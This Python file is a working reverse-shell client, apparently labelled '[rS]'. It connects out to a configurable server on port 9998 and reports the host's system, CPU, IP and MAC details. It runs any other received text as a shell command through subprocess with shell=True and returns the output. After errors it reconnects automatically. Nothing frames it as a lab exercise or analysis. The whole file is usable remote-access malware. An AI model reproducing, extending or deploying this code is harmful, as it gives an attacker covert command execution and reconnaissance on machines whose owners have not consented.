import os
import socket
import psutil
import platform
import subprocess


class Info:
    def __init__(self):
        si = platform.uname()
        cpufreq = psutil.cpu_freq()
        if_addrs = psutil.net_if_addrs()
        self.sys_info = f'System: {si.system}\n' \
                        f'Node Name: {si.node}\n' \
                        f'Release: {si.release}\n' \
                        f'Version: {si.version}\n' \
                        f'Machine: {si.machine}\n' \
                        f'Processor: {si.processor}\n'
        self.cpu_info = f'Physical cores: {psutil.cpu_count(logical=False)} \nTotal cores: {psutil.cpu_count(logical=True)} \nMax Frequency: {cpufreq.max:.2f}Mhz \n' \
                        f'Min Frequency: {cpufreq.min:.2f}Mhz\n'
        self.net_info = ''
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                self.net_info += f"=== Interface: {interface_name} ===\n"
                if str(address.family) == 'AddressFamily.AF_INET':
                    self.net_info += f"  IP Address: {address.address}\n"
                    self.net_info += f"  Netmask: {address.netmask}\n"
                    self.net_info += f"  Broadcast IP: {address.broadcast}\n"
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    self.net_info += f"  MAC Address: {address.address}\n"
                    self.net_info += f"  Netmask: {address.netmask}\n"
                    self.net_info += f"  Broadcast MAC: {address.broadcast}\n"

    @property
    def cpu_frequency(self):
        cpufreq = psutil.cpu_freq()
        return f'Current Frequency: {cpufreq.current:.2f}Mhz\n'

    @property
    def cpu_usage(self):
        cpu_per_core = 'CPU Usage Per Core: \n'
        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            cpu_per_core += f'Core {i}: {percentage}% \n'
        total_cpu_usage = f'Total CPU Usage: {psutil.cpu_percent()}% \n'
        return f'{total_cpu_usage} {cpu_per_core}'


class Client:
    host = '0.0.0.0'  # Server address
    port = 9998
    buffer_size = 1024

    def __init__(self):
        self.info = Info()
        self.s = self.establishing_connection()
        self.main()

    def establishing_connection(self):
        s = socket.socket()
        s.connect((self.host, self.port))
        return s

    def send_message(self, message):
        succ = self.s.send(f'{message}'.encode())
        return succ

    def receive_message(self):
        rec_msg = self.s.recv(self.buffer_size)
        return rec_msg

    def main(self):
        self.send_message('[rS] You have connected.')

        while True:
            try:
                msg = ''
                bits = self.receive_message()
                msg += bits.strip().decode('utf8')
                if msg.lower() == 'exit':
                    break
                # Command handler for handling commands
                self.command_handler(msg)
            except:
                # Close socket
                self.s.close()
                self.s = self.establishing_connection()

    def command_handler(self, command):
        try:
            # Data commands linked to Info class and Info methods
            if command[:8] == 'InfoSys.':
                if command[:16] == 'InfoSys.sys_info':
                    self.send_message(self.info.sys_info)
                elif command[:16] == 'InfoSys.cpu_info':
                    self.send_message(self.info.cpu_info)
                elif command[:16] == 'InfoSys.net_info':
                    self.send_message(self.info.net_info)
                elif command[:26] == 'InfoSys.get_cpu_frequency':
                    self.send_message(self.info.cpu_frequency)
                elif command[:21] == 'InfoSys.get_cpu_usage':
                    self.send_message(self.info.cpu_usage)
                else:
                    self.send_message('[rS] No data command in that name. data.ip/location/machine/core only.')
                    # Normal command promt commands using the shell
            else:
                tsk = subprocess.Popen(args=command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT)
                stdout, stderr = tsk.communicate()
                # Result from subprocess shell stdout decoded in utf8
                result = stdout.decode('utf8')
                if command[:2] == 'cd':
                    os.chdir(command[3:])
                    self.send_message((str(os.getcwd())))
                elif command.lower() == 'exit':
                    # Close socket
                    self.s.close()
                else:
                    # Send result to client
                    self.send_message(f'{result}')
        except Exception as e:
            self.send_message(f'[rS] {e}')


if __name__ == '__main__':
    c = Client()
